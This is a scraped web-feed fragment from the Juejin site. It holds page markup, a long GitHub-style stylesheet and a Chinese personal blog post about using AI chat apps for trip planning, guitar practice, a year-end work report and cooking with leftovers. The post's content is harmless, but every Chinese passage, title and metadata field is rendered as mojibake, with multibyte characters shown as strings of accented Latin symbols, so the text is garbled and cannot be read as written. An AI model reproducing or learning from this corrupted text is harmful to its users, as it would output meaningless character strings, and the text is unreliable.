<!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025ï¼ŒAI å°±è¿™æ ·æºœè¿›äº†æˆ‘ç”Ÿæ´»çš„è¾¹è¾¹è§’è§’]]></title>    <link>https://juejin.cn/post/7597125475602268187</link>    <guid>https://juejin.cn/post/7597125475602268187</guid>    <pubDate>2026-01-20T13:43:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475602268187" data-draft-id="7597125475602202651" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025ï¼ŒAI å°±è¿™æ ·æºœè¿›äº†æˆ‘ç”Ÿæ´»çš„è¾¹è¾¹è§’è§’"/> <meta itemprop="keywords" content="åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-20T13:43:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‹æ¸¡è‹‡"/> <meta itemprop="url" content="https://juejin.cn/user/729731453429159"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025ï¼ŒAI å°±è¿™æ ·æºœè¿›äº†æˆ‘ç”Ÿæ´»çš„è¾¹è¾¹è§’è§’
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/729731453429159/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‹æ¸¡è‹‡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T13:43:19.000Z" title="Tue Jan 20 2026 13:43:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body .octicon{display:inline-block;fill:currentColor;vertical-align:text-bottom}.markdown-body .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown-body .anchor:focus{outline:none}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1:hover .anchor .octicon-link:before,.markdown-body h2:hover .anchor .octicon-link:before,.markdown-body h3:hover .anchor .octicon-link:before,.markdown-body h4:hover .anchor .octicon-link:before,.markdown-body h5:hover .anchor .octicon-link:before,.markdown-body h6:hover .anchor .octicon-link:before{width:16px;height:16px;content:" ";display:inline-block;background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E")}.markdown-body{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;color:#24292e;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body details{display:block}.markdown-body summary{display:list-item}.markdown-body a{background-color:initial}.markdown-body a:active,.markdown-body a:hover{outline-width:0}.markdown-body strong{font-weight:inherit;font-weight:bolder}.markdown-body h1{margin:.67em 0}.markdown-body img{border-style:none}.markdown-body code,.markdown-body kbd,.markdown-body pre{font-family:monospace,monospace;font-size:1em}.markdown-body hr{box-sizing:initial;overflow:visible}.markdown-body input{font:inherit;margin:0;overflow:visible}.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}.markdown-body input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown-body a{color:#0366d6;text-decoration:none}.markdown-body a:hover{text-decoration:underline}.markdown-body strong{font-weight:600}.markdown-body hr{height:0;margin:15px 0;overflow:hidden;background:transparent;border-bottom:1px solid #dfe2e5}.markdown-body hr:after,.markdown-body hr:before{display:table;content:""}.markdown-body hr:after{clear:both}.markdown-body table{border-spacing:0;border-collapse:collapse}.markdown-body td,.markdown-body th{padding:0}.markdown-body details summary{cursor:pointer}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:0;margin-bottom:0}.markdown-body h1{font-size:32px}.markdown-body h1,.markdown-body h2{font-weight:600}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:20px}.markdown-body h3,.markdown-body h4{font-weight:600}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:14px}.markdown-body h5,.markdown-body h6{font-weight:600}.markdown-body h6{font-size:12px}.markdown-body p{margin-top:0;margin-bottom:10px}.markdown-body blockquote{margin:0}.markdown-body ol,.markdown-body ul{padding-left:0;margin-top:0;margin-bottom:0}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type:lower-alpha}.markdown-body dd{margin-left:0}.markdown-body code,.markdown-body pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown-body pre{margin-top:0;margin-bottom:0}.markdown-body input::-webkit-inner-spin-button,.markdown-body input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none;appearance:none}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}.markdown-body .border{border:1px solid #e1e4e8!important}.markdown-body .border-0{border:0!important}.markdown-body .border-bottom{border-bottom:1px solid #e1e4e8!important}.markdown-body .rounded-1{border-radius:3px!important}.markdown-body .bg-white{background-color:#fff!important}.markdown-body .bg-gray-light{background-color:#fafbfc!important}.markdown-body .text-gray-light{color:#6a737d!important}.markdown-body .pl-3,.markdown-body .px-3{padding-left:16px!important}.markdown-body .px-3{padding-right:16px!important}.markdown-body .f6{font-size:12px!important}.markdown-body .lh-condensed{line-height:1.25!important}.markdown-body .text-bold{font-weight:600!important}.markdown-body .pl-c{color:#6a737d}.markdown-body .pl-c1,.markdown-body .pl-s .pl-v{color:#005cc5}.markdown-body .pl-e,.markdown-body .pl-en{color:#6f42c1}.markdown-body .pl-s .pl-s1,.markdown-body .pl-smi{color:#24292e}.markdown-body .pl-ent{color:#22863a}.markdown-body .pl-k{color:#d73a49}.markdown-body .pl-pds,.markdown-body .pl-s,.markdown-body .pl-s .pl-pse .pl-s1,.markdown-body .pl-sr,.markdown-body .pl-sr .pl-cce,.markdown-body .pl-sr .pl-sra,.markdown-body .pl-sr .pl-sre{color:#032f62}.markdown-body .pl-smw,.markdown-body .pl-v{color:#e36209}.markdown-body .pl-bu{color:#b31d28}.markdown-body .pl-ii{color:#fafbfc;background-color:#b31d28}.markdown-body .pl-c2{color:#fafbfc;background-color:#d73a49}.markdown-body .pl-c2:before{content:"^M"}.markdown-body .pl-sr .pl-cce{font-weight:700;color:#22863a}.markdown-body .pl-ml{color:#735c0f}.markdown-body .pl-mh,.markdown-body .pl-mh .pl-en,.markdown-body .pl-ms{font-weight:700;color:#005cc5}.markdown-body .pl-mi{font-style:italic;color:#24292e}.markdown-body .pl-mb{font-weight:700;color:#24292e}.markdown-body .pl-md{color:#b31d28;background-color:#ffeef0}.markdown-body .pl-mi1{color:#22863a;background-color:#f0fff4}.markdown-body .pl-mc{color:#e36209;background-color:#ffebda}.markdown-body .pl-mi2{color:#f6f8fa;background-color:#005cc5}.markdown-body .pl-mdr{font-weight:700;color:#6f42c1}.markdown-body .pl-ba{color:#586069}.markdown-body .pl-sg{color:#959da5}.markdown-body .pl-corl{text-decoration:underline;color:#032f62}.markdown-body .mb-0{margin-bottom:0!important}.markdown-body .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown-body .pl-0{padding-left:0!important}.markdown-body .py-0{padding-top:0!important;padding-bottom:0!important}.markdown-body .pl-1{padding-left:4px!important}.markdown-body .pl-2{padding-left:8px!important}.markdown-body .py-2{padding-top:8px!important;padding-bottom:8px!important}.markdown-body .pl-3{padding-left:16px!important}.markdown-body .pl-4{padding-left:24px!important}.markdown-body .pl-5{padding-left:32px!important}.markdown-body .pl-6{padding-left:40px!important}.markdown-body .pl-7{padding-left:48px!important}.markdown-body .pl-8{padding-left:64px!important}.markdown-body .pl-9{padding-left:80px!important}.markdown-body .pl-10{padding-left:96px!important}.markdown-body .pl-11{padding-left:112px!important}.markdown-body .pl-12{padding-left:128px!important}.markdown-body hr{border-bottom-color:#eee}.markdown-body kbd{display:inline-block;padding:3px 5px;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;color:#444d56;vertical-align:middle;background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body&gt;:first-child{margin-top:0!important}.markdown-body&gt;:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body blockquote,.markdown-body details,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e1e4e8;border:0}.markdown-body blockquote{padding:0 1em;color:#6a737d;border-left:.25em solid #dfe2e5}.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eaecef}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li{word-wrap:break-all}.markdown-body li&gt;p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:600}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto}.markdown-body table th{font-weight:600}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:initial;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body code{padding:.2em .4em;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body pre{word-wrap:normal}.markdown-body pre&gt;code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:initial;border:0}.markdown-body .commit-tease-sha{display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%;color:#444d56}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown-body .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown-body .blob-num{width:1%;min-width:50px;padding-right:10px;padding-left:10px;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;color:rgba(27,31,35,.3);text-align:right;white-space:nowrap;vertical-align:top;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-body .blob-num:hover{color:rgba(27,31,35,.6)}.markdown-body .blob-num:before{content:attr(data-line-number)}.markdown-body .blob-code{position:relative;padding-right:10px;padding-left:10px;line-height:20px;vertical-align:top}.markdown-body .blob-code-inner{overflow:visible;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;color:#24292e;word-wrap:normal;white-space:pre}.markdown-body .pl-token.active,.markdown-body .pl-token:hover{cursor:pointer;background:#ffea7f}.markdown-body .tab-size[data-tab-size="1"]{-moz-tab-size:1;tab-size:1}.markdown-body .tab-size[data-tab-size="2"]{-moz-tab-size:2;tab-size:2}.markdown-body .tab-size[data-tab-size="3"]{-moz-tab-size:3;tab-size:3}.markdown-body .tab-size[data-tab-size="4"]{-moz-tab-size:4;tab-size:4}.markdown-body .tab-size[data-tab-size="5"]{-moz-tab-size:5;tab-size:5}.markdown-body .tab-size[data-tab-size="6"]{-moz-tab-size:6;tab-size:6}.markdown-body .tab-size[data-tab-size="7"]{-moz-tab-size:7;tab-size:7}.markdown-body .tab-size[data-tab-size="8"]{-moz-tab-size:8;tab-size:8}.markdown-body .tab-size[data-tab-size="9"]{-moz-tab-size:9;tab-size:9}.markdown-body .tab-size[data-tab-size="10"]{-moz-tab-size:10;tab-size:10}.markdown-body .tab-size[data-tab-size="11"]{-moz-tab-size:11;tab-size:11}.markdown-body .tab-size[data-tab-size="12"]{-moz-tab-size:12;tab-size:12}.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}</style><style data-highlight="" data-highlight-key="github">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å¹´åˆé‚£é˜µå­ï¼Œæœ‹å‹åœˆã€æŠ€æœ¯ç¾¤åˆ°å¤„éƒ½åœ¨è½¬<strong>DeepSeek</strong>çš„æ¶ˆæ¯ã€‚æˆ‘ä¹Ÿä¸‹è½½äº†ï¼Œéšåï¼Œè±†åŒ…ã€åƒé—®ä¹ŸæŒ¤è¿›äº†å¯åŠ¨æ ã€‚è€ŒåŸæœ¬å®‰é™çš„ç¼–ç æ—¶å…‰ï¼Œç°åœ¨è¢«Cursorå’ŒTraeè¿™äº›ä¼šæ€è€ƒçš„IDEé‡æ–°å®šä¹‰äº†â€”â€”å®ƒä»¬ä¸å†æ˜¯ç­‰å¾…æŒ‡ä»¤çš„å·¥å…·ï¼Œè€Œæ˜¯å¼€å§‹ä¸»åŠ¨æé—®ï¼Œåœ¨æˆ‘å†™ä¸‹ä¸€è¡Œä»£ç å‰ï¼Œå°±å·²ç»ç»™å‡ºäº†ä¸‰å››ç§å¯èƒ½ã€‚</p>
<p>è°çŸ¥é“ç”¨ç€ç”¨ç€ï¼Œè¿™ä¸œè¥¿å°±ä»æˆ‘ç”µè„‘å±å¹•é‡Œæºœå‡ºæ¥ï¼Œé’»è¿›äº†æˆ‘ç”Ÿæ´»çš„å„ä¸ªè§’è½ï¼Œæˆäº†æˆ‘çš„æ—¥å¸¸â€œæ­å­â€ã€‚</p>
</blockquote>
<h2 data-id="heading-0">å‘¨æœ«çš„æ—…è¡Œæ”»ç•¥</h2>
<p>å‘¨å…­æ—©é¤ï¼Œæˆ‘ä»¬ä¸€å®¶äººåƒå®Œé¥­å¯¹ç€é¤æ¡Œå‘å‘†ï¼Œè€å©†é—®ï¼šâ€œåˆå‘¨æœ«äº†ï¼Œæˆ‘ä»¬å»å“ªå„¿ç©å„¿ï¼Ÿâ€</p>
<p>è¿™ä¸ªé—®é¢˜æ¯å¹´éƒ½è®©æˆ‘ä»¬å¤´ç–¼ã€‚æˆ‘é¡ºæ‰‹æ‰“å¼€<strong>DeepSeek</strong>ï¼šâ€œä¸¤ä¸ªæ€•ç´¯çš„ä¸Šç­æ—ï¼Œå¸¦ç€ä¿©å¨ƒï¼Œä¸¤å¤©å‡æœŸï¼Œä¸æƒ³å»ç½‘çº¢åŸå¸‚ã€‚â€</p>
<p>ä¸‰åˆ†é’Ÿåï¼Œä¸€ä»½è¡Œç¨‹èººåœ¨å±å¹•ä¸Šã€‚ä¸æ˜¯é‚£ç§â€œä¸Šåˆé•¿åŸä¸‹åˆæ•…å®«â€çš„æ ‡å‡†æ¨¡æ¿â€”â€”å®ƒå»ºè®®äº†ä¸€ä¸ªå‘¨è¾¹çš„å°é•‡ï¼Œè¿â€œå‘¨æ—¥ä¸‹åˆä¸‰ç‚¹å»xè·¯ï¼Œé‚£ä¼šå„¿é˜³å…‰æ–œç…§é€‚åˆæ‹ç…§â€è¿™ç§ç»†èŠ‚éƒ½æœ‰ã€‚</p>
<p>æœ€ç»çš„æ˜¯å®ƒè¡¥äº†å¥ï¼šâ€œå½“åœ°æœ‰å®¶å¼€äº†ä¸‰åå¹´çš„é¢é¦†ï¼Œä¸‹åˆä¸¤ç‚¹ä»¥åæµ‡å¤´é€‰æ‹©æœ€å¤šã€‚â€</p>
<p>æˆ‘ä»¬çœŸçš„å»äº†ã€‚ç…§ç€å®ƒçš„æ”»ç•¥ï¼Œåœ¨é‚£ä¸ªå‘¨æ—¥ä¸‹åˆä¸‰ç‚¹èµ°è¿›æ–°å¯†çš„ä¸œè¥¿å¤§è¡—ï¼Œå®ƒæ˜¯çŸ³æ¿è·¯è€è¡—ï¼Œé˜³å…‰é€è¿‡è€æ§æ ‘çš„æå¶æ´’åœ¨è·¯é¢ä¸Šï¼Œå…‰å½±æ–‘é©³ã€‚</p>
<p>é¢é¦†ä¹Ÿæ‰¾åˆ°äº†ï¼Œè€æ¿å¨˜å¬è¯´æˆ‘ä»¬æ˜¯â€œç½‘ä¸Šçœ‹åˆ°â€çš„ï¼Œç¬‘å¾—å¾ˆå¼€å¿ƒï¼šâ€œç°åœ¨çš„å¹´è½»äººï¼ŒçœŸä¼šæ‰¾åœ°æ–¹ã€‚â€</p>
<h2 data-id="heading-1">æˆ‘é‚£æŠŠè½äº†ç°çš„å‰ä»–</h2>
<p>ä¹¦æˆ¿è§’è½é‡Œçš„å‰ä»–ï¼ŒæŒ‡æ¿ä¸Šçš„ç°æ”’äº†æœ‰ä¸€é˜µå­äº†ã€‚</p>
<p>ç›´åˆ°æŸä¸ªç¨å¾®ä¸é‚£ä¹ˆå¿™çš„ä¸‹åˆï¼Œæˆ‘é¬¼ä½¿ç¥å·®åœ°æ‰“å¼€å®ƒï¼Œå‘ç°è¿Gå’Œå¼¦éƒ½æŒ‰ä¸å‡†äº†ã€‚</p>
<p>æˆ‘åœ¨<strong>è±†åŒ…</strong>å¯¹è¯æ¡†é‡Œæ‰“å­—ï¼šâ€œå¦‚ä½•å¿«é€Ÿç»ƒä¹ å‰ä»–ï¼Ÿæ¯å¤©åªæœ‰åŠå°æ—¶ã€‚â€</p>
<p>å®ƒæ²¡ç»™æˆ‘æ¯ç‡¥çš„çˆ¬æ ¼å­ç»ƒä¹ ï¼Œåè€Œè¯´ï¼šâ€œå…ˆæ‰¾ä½ ä»¥å‰æœ€å–œæ¬¢çš„é‚£é¦–æ­Œï¼Œå“ªæ€•åªå¼¹å‰å¥ã€‚è®°å¿†ä¼šè®©æ‰‹æŒ‡æ…¢æ…¢é†’è¿‡æ¥ã€‚â€</p>
<p>æˆ‘æ‰¾äº†ã€Šæ›¾ç»çš„ä½ ã€‹è¿™é¦–æ­Œï¼Œå‘ç° Bm å’Œå¼¦çœŸ tm éš¾æŒ‰ï¼Œæˆ‘æ‹ç…§å‘ç»™å®ƒï¼šâ€œè¿™ä¸ª Bm å’Œå¼¦ï¼Œå°æ‹‡æŒ‡æ²¡åŠ›æ°”ã€‚â€</p>
<p>å®ƒå›å¤å¾—å¾ˆå¿«ï¼šâ€œè¯•è¯•æŠŠæ‹‡æŒ‡æ”¾åœ¨ç´é¢ˆèƒŒåï¼Œæ­£å¯¹é£ŸæŒ‡å’Œä¸­æŒ‡ä¹‹é—´ã€‚Bméœ€è¦æ‰‹è…•å¾€å‰é€ä¸€ç‚¹ï¼Œåƒåœ¨æ¨é—¨ã€‚</p>
<p>æœ€è®©æˆ‘æƒŠè®¶çš„æ˜¯å®ƒçš„è€å¿ƒã€‚åŒæ ·çš„é—®é¢˜æˆ‘é—®äº†å®ƒä¸‰éï¼Œå®ƒç»™äº†ä¸‰ç§ä¸åŒçš„æ¯”å–»ï¼šæ¡é¸¡è›‹ã€æ­å¸ç¯·ã€æŒ‰é—¨é“ƒã€‚è€Œå®ƒæ°¸è¿œä¸ä¼šåŸ‹æ€¨ä½ ï¼šâ€œè¿™ä¹ˆç®€å•éƒ½è®°ä¸ä½ï¼Ÿâ€</p>
<p>ç°åœ¨ï¼Œé‚£æŠŠå‰ä»–å¸¸å¸¸ç«–åœ¨åºŠå¤´ï¼Œä½†æŒ‡æ¿ä¸Šæ²¡æœ‰ç°äº†ã€‚</p>
<h2 data-id="heading-2">å®ƒå¸®æˆ‘å†™å·¥ä½œæŠ¥å‘Š</h2>
<p>æ¯å¹´å¹´æœ«ï¼Œå…¬å¸éƒ½ä¼šè¦æ±‚å†™å¹´ç»ˆâ€œé‡ç‚¹å·¥ä½œæŠ¥å‘Šâ€ï¼Œä¹‹å‰æˆ‘æ€»è¦å¯¹ç€ç©ºç™½çš„æ–‡æ¡£å‘å‘†ä¸€é˜µå­ã€‚ä»Šå¹´ï¼Œç»ˆäºä¸ç”¨äº†ã€‚</p>
<p>æˆ‘æŠŠé‡ç‚¹å·¥ä½œæçº²å‘ç»™<strong>åƒé—®</strong>ï¼šâ€œæ ¼å¼å‚ç…§è¿™ä¸ªï¼Œå†…å®¹æ›´æ–°ï¼Œé‡ç‚¹å†™é¡¹ç›®ä¸‰çš„è¿›å±•ã€‚åˆ«å¤ªç©ºï¼Œæ¥ç‚¹å®é™…æ•°æ®ã€‚â€</p>
<p>ä¸‰åç§’åï¼Œä¸€ä»½ç»“æ„æ¸…æ™°çš„åˆç¨¿å‡ºæ¥äº†ã€‚æˆ‘éœ€è¦çš„åªæ˜¯æŠŠå…¶ä¸­â€œæ˜¾è‘—æå‡äº†ç³»ç»Ÿæ•ˆèƒ½â€æ”¹æˆâ€œå“åº”æ—¶é—´ä»2.3ç§’é™åˆ°1.1ç§’â€ï¼ŒæŠŠâ€œåŠ å¼ºäº†å›¢é˜Ÿåä½œâ€æ¢æˆâ€œæ¯å‘¨äºŒçš„æŠ€æœ¯åˆ†äº«ä¼šå‡ºå‹¤ç‡ç¨³å®šåœ¨80%â€ã€‚</p>
<p>å®ƒç”šè‡³è¿˜æé†’æˆ‘ï¼šâ€œè®°å¾—åœ¨â€˜ä¸è¶³ä¹‹å¤„â€™éƒ¨åˆ†åŠ ä¸€å¥â€˜å¯¹æ–°å…´æŠ€æœ¯çš„å­¦ä¹ æ—¶é—´æŠ•å…¥ä¸è¶³â€™ï¼Œé¢†å¯¼å–œæ¬¢çœ‹åˆ°è¿™ä¸ªã€‚â€</p>
<p>æˆ‘ç…§åšäº†ã€‚ä¸åˆ°ä¸€ä¸ªå°æ—¶ï¼Œæˆ‘æŒ‰æ—¶å…³ç”µè„‘ï¼Œé™ªå­©å­ä»¬å»çœ‹äº†ä¸€åœºä¸´æ—¶çš„ç”µå½±ã€‚èµ°å‡ºç”µå½±é™¢æ—¶ï¼Œæˆ‘æƒ³èµ·ä»¥å¾€è¿™æ—¶å€™ï¼Œæˆ‘é€šå¸¸è¿˜åœ¨åŠå…¬å®¤åˆ åˆ æ”¹æ”¹ã€‚</p>
<h2 data-id="heading-3">å®ƒç”šè‡³ç®¡èµ·äº†æˆ‘çš„èœè°±</h2>
<p>ä¸Šå‘¨äº”æ™šä¸Šï¼Œå†°ç®±é‡Œåªå‰©ä¸‹ä¸€é¢—è¥¿å…°èŠ±ã€ä¸‰ä¸ªé¸¡è›‹å’ŒåŠç›’è™¾ä»ã€‚è€å©†å’Œå­©å­ä»¬éƒ½ä¸åœ¨å®¶ï¼Œæˆ‘å¤§çœ¼çªå°çœ¼ï¼Œå‡†å¤‡ç‚¹å¤–å–äº†ã€‚</p>
<p>æˆ‘çªç„¶çµå…‰ä¸€ç°ï¼Œåˆæ‰“å¼€äº†<strong>DeepSeek</strong>ï¼šâ€œè¿™äº›èƒ½åšä»€ä¹ˆï¼Ÿè¦å¿«ï¼Œé¥¿äº†ã€‚â€</p>
<p>ä¸‰åç§’åï¼Œèœè°±æ¥äº†ï¼šè¥¿å…°èŠ±è™¾ä»è’¸è›‹ã€‚æ­¥éª¤è¯¦ç»†åˆ°â€œæ°´å¼€åè½¬ä¸­ç«è’¸å…«åˆ†é’Ÿï¼Œå…³ç«ç„–ä¸¤åˆ†é’Ÿå£æ„Ÿæœ€å«©ã€‚â€</p>
<p>æˆ‘ç…§ç€åšäº†ã€‚è’¸è›‹å‡ºé”…æ—¶ï¼Œæµ…å°ä¸€å‹ºï¼ŒWCï¼Œè¿˜æŒºå¥½åƒã€‚</p>
<p>ç°åœ¨è¿™æˆäº†æˆ‘å®¶ä¿ç•™é¡¹ç›®â€”â€”æ¯å‘¨æ¸…å†°ç®±æ—¥ï¼Œè®©AIçœ‹çœ‹å‰©èœèƒ½å˜å‡ºä»€ä¹ˆèŠ±æ ·ã€‚ä¸Šä¸ªæœˆå®ƒç”¨å‰©ç±³é¥­ã€åˆé¤è‚‰å’Œå†·å†»ç‰ç±³ï¼ŒæŒ‡æŒ¥ç€åšäº†ä¸ªä»€é”¦ç‚’é¥­ï¼Œå¥½åƒåˆ°æˆ‘ç‰¹æ„è®°ä¸‹äº†æ­¥éª¤ã€‚</p>
